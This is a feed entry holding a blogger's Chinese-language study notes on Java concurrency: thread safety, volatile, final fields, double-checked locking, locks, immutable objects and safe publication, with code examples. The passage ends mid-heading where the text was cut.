    <link href="https://h-zex.github.io/2019/03/02/Java-Concurrent-Note/"/>
    <id>https://h-zex.github.io/2019/03/02/Java-Concurrent-Note/</id>
    <published>2019-03-02T04:49:04.000Z</published>
    <updated>2019-03-06T16:17:41.041Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下大部分是《java并发编程实战》的笔记，以<code>JCIP</code>简称之</p></blockquote><h3 id="对象的状态"><a href="#对象的状态" class="headerlink" title="对象的状态"></a>对象的状态</h3><ul><li>（非正式意义上），对象的状态是指存储在状态变量中的数据，可能包括其他依赖对象的域（例如HashMap的Map.Entry对象）</li><li>对象的状态中包含了任何可能影响其外部可见行为的数据</li></ul><h3 id="线程安全性的定义"><a href="#线程安全性的定义" class="headerlink" title="线程安全性的定义"></a>线程安全性的定义</h3><ul><li>正确性的含义<ul><li>某个类的行为与其规范完全一致。在良好的规范中通常会定义各种不变性条件（Invariant）来约束对象的状态，以及定义各种后验条件来描述对象操作的结果</li></ul></li><li>当多个线程访问某个类时，这个类始终能够表现出正确的行为，那么就称这个类是线程安全的</li></ul><h3 id="JCIP中“同步”的含义"><a href="#JCIP中“同步”的含义" class="headerlink" title="JCIP中“同步”的含义"></a>JCIP中“同步”的含义</h3><ul><li>synchronized关键字</li><li>volatile变量</li><li>显式锁</li><li>原子变量</li></ul><h3 id="竞态条件"><a href="#竞态条件" class="headerlink" title="竞态条件"></a>竞态条件</h3><ul><li>在并发编程中，由于不恰当的执行时序而出现不正确的结果（这不是正式的定义）</li><li>竞态条件类型举例<ul><li>先检查后执行（比如<code>if(i==1) {i=10;}</code>）。大多数竞态条件的本质：基于一种可能失效的观察结果来做出判断或执行计算</li></ul></li><li>并非所有的竞态条件都是数据竞争，同样并非所有的数据竞争都是竞态条件</li></ul><h3 id="数据竞争"><a href="#数据竞争" class="headerlink" title="数据竞争"></a>数据竞争</h3><ul><li><p>访问共享的非final类型的域时没有采用同步来协同，则会出现数据竞争</p><blockquote><p>A data race occurs when:</p><ul><li>two or more threads in a <strong>single process</strong> access the same memory location concurrently, and</li><li>at least one of the accesses is for writing, and</li><li>the threads are not using any exclusive locks to control their accesses to that memory.</li></ul><p>When these three conditions hold, the order of accesses is non-deterministic, and the computation may give different results from run to run depending on that order. Some data-races may be benign (for example, when the memory access is used for a busy-wait), but many data-races are bugs in the program.</p><p><a href="https://docs.oracle.com/cd/E19205-01/820-0619/geojs/index.html" target="_blank" rel="noopener">ref from</a></p></blockquote></li><li><p>在java的内存模型中，如果在代码中存在数据竞争，那么这段代码就没有确定的语义</p></li></ul><h3 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h3><ul><li>假定有两个操作A、B，从执行A的线程来看，当另一个线程执行B时，要么将B完全执行完，要么完全不执行B，那么A和B对彼此来说是原子的</li><li>原子操作是指，对于访问同一个状态的所有操作（包括这个操作本身）来说，这个操作是以一种原子方式执行</li><li>与事务应用程序中的和原子性有相同的含义：一组语句作为一个不可分割的单元被执行</li></ul><h3 id="volatile变量"><a href="#volatile变量" class="headerlink" title="volatile变量"></a>volatile变量</h3><ul><li><p>只有成员变量才能使用它</p></li><li><p>用来确保变量的更新操作通知到其他线程</p><p>以下代码可以复现，无论是否有<code>server</code>模式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VolatileTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 去掉volatile，则无限循环</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> sleep = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (!sleep) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"out of sleep"</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        sleep = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>anything that was visible to thread A when it writes to volatile field <code>f</code> becomes visible to thread B when it reads <code>f</code>.</p></li><li><p>synchronized在内存可见性上的作用比volatile变量更强</p></li><li><p>依赖volatile变量来控制状态的可见性，通常比使用锁的代码更加脆弱，更加难以理解</p></li><li><p>无法确保原子性（锁可以确保原子性和可见性）</p></li><li><p>正确的使用方式</p><ul><li>确保他们状态的可见性</li><li>确保它们所引用的状态的可见性</li><li>标志一些重要的程序生命周期事件的发生</li></ul></li><li><p>满足以下所有条件时，才应该使用</p><ul><li>对变量的写入不依赖于当前值，或者只有单个线程<strong>写</strong>该变量</li><li>该变量不会与其他状态变量一起纳入不变性条件中</li><li>在访问变量时不需要加锁</li></ul></li><li><p>关于重排序</p><blockquote><p><a href="https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html" target="_blank" rel="noopener">来自于</a></p><p>正确性有待验证</p></blockquote><ul><li><p>旧内存模型</p><ul><li>Under the old memory model, accesses to volatile variables could not be reordered with each other, but they could be reordered with nonvolatile variable accesses.</li></ul></li><li><p>新内存模型（新内存模型是JSR133）</p><ul><li><p>Under the new memory model, it is still true that volatile variables cannot be reordered with each other. The difference is that it is now no longer so easy to reorder normal field accesses around them.</p></li><li><p>Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, <strong>anything that was visible to thread A when it writes to volatile field <code>f</code> becomes visible to thread B when it reads <code>f</code>.</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VolatileExample</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">boolean</span> v = <span class="keyword">false</span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    x = <span class="number">42</span>;</span><br><span class="line">    v = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (v == <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="comment">// uses x - guaranteed to see 42.</span></span><br><span class="line">      <span class="comment">// This would not have been true under the old memory model. </span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Effectively, the semantics of volatile have been strengthened substantially, almost to the level of synchronization. Each read or write of a volatile field acts like “half” a synchronization, for purposes of visibility.</p></li><li><p>Note that it is important for both threads to access the same volatile variable in order to properly set up the happens-before relationship. It is not the case that everything visible to thread A when it writes volatile field <code>f</code> becomes visible to thread B after it reads volatile field <code>g</code>. <strong>The release and acquire have to “match” </strong>(i.e., be performed on the same volatile field) to have the right semantics</p></li></ul></li></ul></li></ul><h3 id="对象的初始化"><a href="#对象的初始化" class="headerlink" title="对象的初始化"></a>对象的初始化</h3><ul><li>即使某个对象的引用对于其他线程是可见的，也并不意味着对象状态对于使用该对象的线程一定是可见的</li><li>为了确保对象状态能够呈现出一致的视图，必须使用同步</li></ul><h3 id="Final域"><a href="#Final域" class="headerlink" title="Final域"></a>Final域</h3><ul><li><p>还有一种情况可以安全地访问一个共享域， 即这个域声明为 final 时</p></li><li><p>在java内存模型中，final域能确保初始化过程的安全性，从而可以不受限制的访问不可变对象，并在共享这些对象时无需同步。为了维持这种初始化安全性的保证，需要满足不可变性的所有需求</p><ul><li>状态不可修改</li><li>所有域都是final类型</li><li>正确的构造</li></ul><p>这种保证还延伸到正确创建的对象中所有final类型的域，在没有额外同步的情况下，也可以安全的访问final类型的域。不过，如果这些final域指向的是可变对象，那么访问这些域所指向的对象的状态时还是需要同步</p></li><li><p>（？）考虑以下声明：<code>final Map&lt;String, Double&gt;accounts = new HashKap&lt;&gt;()</code>；其他线程会在构造函数完成构造之后才看到这个 accounts 变量。如果不使用 final，就不能保证其他线程看到的是 accounts 更新后的值，它们可能都只是看到 null, 而不是新构造的 HashMap</p></li></ul><h3 id="原子变量"><a href="#原子变量" class="headerlink" title="原子变量"></a>原子变量</h3><ul><li>如果有大量线程要访问相同的原子值， 性能会大幅下降， 因为乐观更新需要太多次重试。</li><li>Java SE 8 提供了 LongAdder 和 LongAccumulator 类来解决这个问题。LongAdder 包括多个变量（加数)， 其总和为当前值。可以有多个线程更新不同的加数，线程个数增加时会自动提供新的加数。通常情况下， 只有当所有工作都完成之后才需要总和的值， 对于这种情况，这种方法会很高效。性能会有显著的提升。</li></ul><h3 id="Double-Checked-Locking-DCL"><a href="#Double-Checked-Locking-DCL" class="headerlink" title="Double Checked Locking(DCL)"></a>Double Checked Locking(DCL)</h3><blockquote><p><a href="https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html" target="_blank" rel="noopener">来自于</a></p><p>正确性有待进一步验证</p></blockquote><ul><li><p>示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// double-checked-locking - don't do this!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Something instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Something <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (instance == <span class="keyword">null</span>)</span><br><span class="line">        instance = <span class="keyword">new</span> Something();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>There’s only one problem with it – <strong>it doesn’t work</strong>. Why not? The most obvious reason is that the writes which initialize <code>instance</code> and the write to the <code>instance</code> field can be reordered by the compiler or the cache, which would have the effect of <strong>returning what appears to be a partially constructed <code>Something</code></strong>. The result would be that we read an uninitialized object. </p></li><li><p>There is no way to fix it using the <strong>old Java memory model.</strong></p></li><li><p>Under the new memory model, making the <code>instance</code> field volatile will “fix” the problems with double-checked locking, because then there will be a happens-before relationship between the initialization of the <code>Something</code> by the constructing thread and the return of its value by the thread that reads it.（我猜，这个happen-before是不是就是<code>程序顺序规则</code>（each action in a thread haappens-before every action in that thread that come later in the program order）和<code>传递性</code>和<code>volatile 变量规则</code>的结合——就是<code>instance=new Something()</code>在单线程中必须保证构造操作在赋值给instance操作之前，然后volatile又保证了写入在读取之前，所以一旦另一个线程读取了instance，则根据传递性，构造操作已经完成了）</p></li><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Something</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Something</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyHolder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> Something INSTANCE = <span class="keyword">new</span> Something();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Something <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazyHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This code is guaranteed to be correct because of the initialization guarantees for static fields; if a field is set in a static initializer, it is guaranteed to be made visible, correctly, to any thread that accesses that class.</p></li></ul><h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><ul><li>作用<ul><li>互斥</li><li>原子性（复合操作的执行过程中持有一个锁，则这组操作成为原子操作）</li><li>内存可见性（所有线程都能看到共享变量的最新值——只需要所有线程都在同一个锁上同步）</li></ul></li></ul><h3 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h3><ul><li>用于实现原子性</li><li>可重入</li><li>确定临界区</li><li>Constructors in Java can not use the synchronized keyword，但是可以<code>synchronized(this){}</code></li><li>内存可见性——某个线程修改了对象状态后，其他线程可以看到发生的状态的变化</li><li>每个对象都有一个内部锁，该锁有一个内部条件（条件对应Object对象的final方法<code>wait</code>、<code>notify</code>、<code>notifyAll</code>方法）（所以一旦某个对象的一个<code>synchronized</code>方法被调用后，该对象的另一个<code>synchronized</code>方法会被阻塞）</li><li>调用synchronized静态方法获得相关的类对象（Class对象）的内部锁。要注意，使用不同的classLoader加载出来的Class对象是不同的</li><li><p>监视器</p><ul><li>用Java的术语来讲，监视器具有如下特性：<ul><li>监视器是只包含私有域的类。</li><li>每个监视器类的对象有一个相关的锁。</li><li>使用该锁对所有的方法进行加锁。换句话说，如果客户端调用obj.meth0d(),那么obj对象的锁是在方法调用开始时自动获得（这是获得锁的唯一途径），并且当方法返回时自动释放该锁（无论是正常退出还是异常退出）。因为所有的域是私有的，这样的安排可以确保一个线程在对对象操作时，没有其他线程能访问该域</li><li>该锁可以有任意多个相关条件</li></ul></li><li>Java设计者以不是很精确的方式采用了监视器概念，Java中的每一个对象有一个内部的锁和内部的条件。如果一个方法用synchronized关键字声明，那么，它表现的就像是一个监视器方法。通过调用wait/notifyAll/notify来访问条件变量。然而，在下述的3个方面Java对象不同于监视器，从而使得线程的安全性下降：<ul><li>域不要求必须是private。</li><li>方法不要求必须是synchronized。</li><li>内部锁对客户是可用的。</li></ul></li></ul></li><li><p>局限</p><ul><li>不能中断一个正在试图获得锁的线程</li><li>没有超时</li><li>只有单一的条件</li><li>不提供公平的锁</li></ul></li></ul><h3 id="内存可见性"><a href="#内存可见性" class="headerlink" title="内存可见性"></a>内存可见性</h3><ul><li>最低安全性<ul><li>某个线程没有同步情况下读取变量，可能会得到一个失效值，但这个值至少是之前某个线程设置的，而不是随机的</li><li>Java内存模型要求，变量的读取和写入必须是原子操作，但是非<code>volatile</code>的<code>long</code>，<code>double</code>例外</li><li>JVM允许将64bit的读或写操作分解为两个32bit的操作，因此可能无法满足最低安全性（除非用<code>volatile</code>声明或是用锁保护）</li></ul></li></ul><h3 id="不可变对象"><a href="#不可变对象" class="headerlink" title="不可变对象"></a>不可变对象</h3><h5 id="需要满足的条件"><a href="#需要满足的条件" class="headerlink" title="需要满足的条件"></a>需要满足的条件</h5><ul><li>对象创建后其状态不能修改</li><li>对象的所有域是final类型的（可以不用，比如<code>String</code>的<code>hashCode</code>这个field）</li><li>对象是正确创建的（创建期间，this没有逸出）</li></ul><h5 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h5><ul><li><p>对象内部可以使用可变对象来管理状态</p></li><li><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreeStooges</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;String&gt; stooges = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreeStooges</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        stooges.add(<span class="string">"Moe"</span>);</span><br><span class="line">        stooges.add(<span class="string">"Larry"</span>);</span><br><span class="line">        stooges.add(<span class="string">"Curly"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isStooge</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stooges.contains(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用<code>volatile</code>+不可变对象来实现一组状态的原子操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OneValueCache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> BigInteger lastNumber;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> BigInteger[] lastFactors;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OneValueCache</span><span class="params">(BigInteger i,</span></span></span><br><span class="line"><span class="function"><span class="params">                         BigInteger[] factors)</span> </span>&#123;</span><br><span class="line">        lastNumber = i;</span><br><span class="line">        <span class="comment">// 如果没有这个copyOf，就不是不可变的</span></span><br><span class="line">        lastFactors = Arrays.copyOf(factors, factors.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> BigInteger[] getFactors(BigInteger i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (lastNumber == <span class="keyword">null</span> || !lastNumber.equals(i))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> Arrays.copyOf(lastFactors, lastFactors.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VolatileCachedFactorizer</span> <span class="keyword">implements</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> OneValueCache cache =</span><br><span class="line">            <span class="keyword">new</span> OneValueCache(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse resp)</span> </span>&#123;</span><br><span class="line">        BigInteger i = extractFromRequest(req);</span><br><span class="line">        <span class="comment">// 如果这里多个请求到来，某个请求调用getFactors调用到一半</span></span><br><span class="line">        <span class="comment">// 然后另一个请求则把cache赋值成另外一个对象，那么有没有问题？</span></span><br><span class="line">        <span class="comment">// 似乎c++就不可以这样做，因为这个需要自动垃圾收集</span></span><br><span class="line">        BigInteger[] factors = cache.getFactors(i);</span><br><span class="line">        <span class="keyword">if</span> (factors == <span class="keyword">null</span>) &#123;</span><br><span class="line">            factors = factor(i);</span><br><span class="line">            cache = <span class="keyword">new</span> OneValueCache(i, factors);</span><br><span class="line">        &#125;</span><br><span class="line">        encodeIntoResponse(resp, factors);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="正确的发布"><a href="#正确的发布" class="headerlink" title="正确的发布"></a>正确的发布</h3><ul><li><p>发布（publish）：使对象能够在当前作用域之外的代码中使用</p></li><li><p>逸出（escape）：某个不该发布的对象被发布</p></li><li><p>不可变对象可以通过任意的机制发布</p></li><li>事实不可变对象（比如某个<code>Date</code>对象被构造后，就只执行读操作，类似于java要求lambda可以读取的lambda外变量是“事实不可变的”）可以通过安全的方式发布</li><li>可变对象必须通过安全的方式来发布，并且必须是线程安全的或者某个锁保护起来</li></ul><h5 id="可变对象的正确的发布"><a href="#可变对象的正确的发布" class="headerlink" title="可变对象的正确的发布"></a>可变对象的正确的发布</h5><ul><li><p>即使某个对象的引用对于其他线程是可见的，也不意味着对象状态对于使用该对象的线程是一定可见的。为了确保对象状态呈现出一致性视图（对象的引用与对象的状态必须同时对其他线程可见），必须要使用<strong>同步</strong>（包括发布时和使存用时）</p></li><li><p>常用的发布模式</p><ul><li><p>在静态初始化函数中初始化一个对象引用（不知道“静态初始化函数”是否等价于“静态初始化器”）（因为静态初始化器由JVM在类的初始化阶段执行，JVM内部存在同步机制）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Holder holder = <span class="keyword">new</span> Holder(<span class="number">42</span>);</span><br></pre></td></tr></table></figure></li><li><p>将对象的引用保存在volatile类型的域或者AtomicReference对象中</p></li><li><p>将对象的引用保存在某个正确构造对象的final类型域中</p></li><li><p>将对象的引用保存在一个由锁保护的域中</p><ul><li>线程安全容器（比如<code>Hashtable</code>、<code>synchronizedMap</code>、<code>ConcurrentMap</code>、<code>Vector</code>、<code>CopyOnWriteArrayList</code>、<code>CopyOnWriteArraySet</code>、<code>synchronizedList</code>、<code>synchronizedSet</code>、<code>BlockingQueue</code>、<code>ConcurrentLinkedQueue</code>）内部的同步意味着将对象放入到某个容器中，将满足这一条要求）</li><li><code>Future</code>、<code>Exchanger</code>也可以</li></ul></li></ul></li></ul><h5 id="不可变对象的正确的发布"><a href="#不可变对象的正确的发布" class="headerlink" title="不可变对象的正确的发布"></a>不可变对象的正确的发布</h5><ul><li>Java内存模型为不可变对象的共享提供了一种特殊的初始化安全性保证</li><li>即使在发布不可变对象的引用时没有使用同步，也可以安全的访问该对象。为了实现这种安全，对象必须满足上面提到的不可变对象的所有要求</li><li>这种保证还包括被<strong>正确创建对象</strong>中的所有final类型的域。但是如果这些域是可变对象，那么在访问时还是需要同步</li></ul><h3 id="lambda使用外部的对象（或value-type的变量）"><a href="#lambda使用外部的对象（或value-type的变量）" class="headerlink" title="lambda使用外部的对象（或value type的变量）"></a>lambda使用外部的对象（或value type的变量）</h3><blockquote><p>以下均为我个人根据final域的特性认为的——不知道final域与final变量的差别是什么</p></blockquote><ul><li>lambda可以使用外部的final或事实final的变量</li><li>如果是这个final对象引用的变量，没有问题，可见（就是引用对于其他线程可见时，其内部的状态也是，可以保证一致性）</li><li>如果引用的是可变对象，则要同步</li></ul><h3 id="内部类与final变量"><a href="#内部类与final变量" class="headerlink" title="内部类与final变量"></a>内部类与final变量</h3><ul><li>TODO：内部类引用外部的变量时，不要求其为final的，那么怎么办，可见性如何保证</li></ul><h3 id="volatile-vs-锁"><a href="#volatile-vs-锁" class="headerlink" title="volatile vs 锁"></a>volatile vs 锁</h3><ul><li>锁可以确保可见性和原子性</li><li>volatile只确保可见性</li></ul><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><ul><li>开发服务器应用时，要始终加上<code>-server</code>参数，client模式的JVM优化与server的不一样</li></ul><h3 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h3><ul><li>内存屏障<ul><li>Other processors exhibit a weaker memory model, where special instructions, called <strong>memory barriers</strong>, are required to flush or invalidate the local processor cache in order to see writes made by other processors or make writes by this processor visible to others. These memory barriers are usually performed when lock and unlock actions are taken; they are invisible to programmers in a high level language.</li></ul></li></ul><h3 id="设计线程安全类"><a href="#设计线程安全类" class="headerlink" title="设计线程安全类"></a>设计线程安全类</h3><ul><li>三个要素<ul><li>找出构成对象状态的所有变量<ul><li>如果在对象域中引用了其他对象，那么该对象的状态就包含被引用对象的域</li><li>在定义哪些变量将构成对象的状态时，只考虑对象拥有的数据</li></ul></li><li>找出约束状态变量的不变性条件</li><li>建立对象状态的并发访问管理策略<ul><li>同步策略定义了如何在不违背对象不变条件或后验条件（在操作中会包含一些后验条件来判断状态的迁移是否有效——比如要求某变量如果当前是17，那么下一次更新是18）的情况下对其状态的访问操作进行协同</li><li>同步策略规定了如何将不可变性、线程封闭、加锁机制等结合起来维护线程的安全性。还规定了哪些变量由哪些锁来保护</li><li>必须要将同步策略写为正式文档</li></ul></li></ul></li><li>尽可能使用final域以缩小状态空间</li><li>如果变量的某些状态是无效的，那么就要对该变量进行封装以避免用户的修改使得该变量处于无效状态。如果某个操作中存在无效的状态转换那么该操作就必须是原子的</li><li>如果一个类是由多个独立且线程安全的状态变量组成，并且所有的操作都不包含无效的状态转换，那么可以将线程安全性委托给底层的状态变量</li><li>如果一个状态变量是线程安全的，并且没有任何不变性条件来约束它的值，在变量的操作上也不存在任何不允许的状态转换（然而按照线程安全的定义，似乎如果满足以上要求，那么线程安全也就必然满足），那么就可以安全地发布这个变量</li></ul><h3 id="基于现有的线程安全类添加特性"><a href="#基于现有的线程安全类添加特性" class="headerlink" title="基于现有的线程安全类添加特性"></a>基于现有的线程安全类添加特性</h3><ul><li>最好的方法是直接修改原始类，这需要理解代码中的同步策略。好处在于所有实现同步策略的代码在同一个源文件中</li><li>另一种方法是extend这个类，但是可能有的类的一些状态是private，子类访问不到，所以行不通。不好的地方在于同步策略的实现被分布到多个单独维护的源文件中，如果底层的类改变了同步策略那么子类就不安全了。</li><li>客户端加锁：对于使用对象X的用户代码，在用户代码中，使用X本身用于保护其状态的锁来保护这段用户代码。这里的问题在于，如果文档没有明确指出X使用的锁，那么这个锁在以后版本中可能会修改，从而导致用户代码相对于X的代码不是原子的（在用户代码执行过程中，X内的代码可能执行）。这种会破坏同步策略的封装性（类似于extend会破坏实现的封装性）。与前一种一样，都是将派生类的行为与基类的行为耦合在一起</li><li>组合：类似于<code>Collections.synchronizedXXX</code>，用户传递一个对象给该方法（转移所有权，以后都通过这个工厂方法返回的对象来操作），新对象内使用委托和加锁来实现。这种不依赖于被委托对象的线程安全性和使用的锁策略</li></ul><h3 id="依赖状态的操作"><a href="#依赖状态的操作" class="headerlink" title="依赖状态的操作"></a>依赖状态的操作</h3><ul><li>类的不变性条件和后验条件约束了在对象上有哪些状态和状态转换是有效的。在某些对象的方法中还包含一些基于状态的先验条件（比如，从队列中pop时，队列必须非空）。如果某个操作中包含有基于状态的先验条件，则这个操作就叫做依赖状态的操作</li></ul><h3 id="使用私有的锁-vs-使用对象的内置锁"><a href="#使用私有的锁-vs-使用对象的内置锁" class="headerlink" title="使用私有的锁 vs 使用对象的内置锁"></a>使用私有的锁 vs 使用对象的内置锁</h3><ul><li>优点<ul><li>私有锁可以将锁封闭起来，避免用户代码得到锁，以避免用户代码参与到同步策略中</li><li>如果使用内置锁，要想验证锁是否被正确使用，需要检查整个程序</li></ul></li></ul><h3 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h3><blockquote><p>来自JCIP的5.2.1，不清楚JDK5之后有没有修改</p></blockquote><ul><li>使用一种粒度更细的加锁机制——分段锁</li><li>一定数量的写入线程可以并发的修改Map</li><li>迭代器具有弱一致性，而不是fail-fast（HashMap等的是fail-fast，从而如果迭代时发现数量变化了，就会抛出<code>ConcurrentModificationException</code>），不会抛出<code>ConcurrentModificationException</code>。可以容忍并发的修改</li><li><code>size</code>返回的只是估计值</li><li>内部没有实现对map加锁以独占访问（对比之下，同步容器<code>Hashtable</code>，<code>synchronizedMap</code>中可以通过获取map的锁来实现独占），所以不能在用户代码通过获取map的锁来独占（所以如果确实需要独占，应该放弃ConcurrentHashMap）</li></ul><h3 id="串行线程的封闭"><a href="#串行线程的封闭" class="headerlink" 